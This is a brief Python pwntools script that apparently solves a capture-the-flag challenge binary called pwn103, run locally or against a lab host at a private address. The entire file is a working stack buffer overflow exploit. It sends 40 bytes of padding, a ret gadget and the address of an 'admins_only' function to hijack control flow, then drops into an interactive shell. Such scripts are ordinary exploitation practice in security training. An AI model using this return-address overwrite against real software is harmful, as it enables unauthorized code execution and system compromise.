#!/usr/bin/python3

from pwn import *

local = True
filename = './pwn103.pwn103'
hostname = '10.10.186.88'
port = 9003
is_debug = False
shell_func_name = 'admins_only'

e = ELF(filename)
shell_func = e.symbols.admins_only

rop = ROP(e)
ret = rop.ret.address
print(f'ret is at {ret}')

if local:
    if is_debug:
        p = gdb.debug(filename, '''
        break admins_only
        continue
        ''')
    else:
        p = process(filename)
else:
    p = remote(hostname, port)

payload = b"A" * 40
payload += p64(ret)
payload += p64(shell_func)

p.sendline(b'3')
p.sendline(payload)
p.interactive()



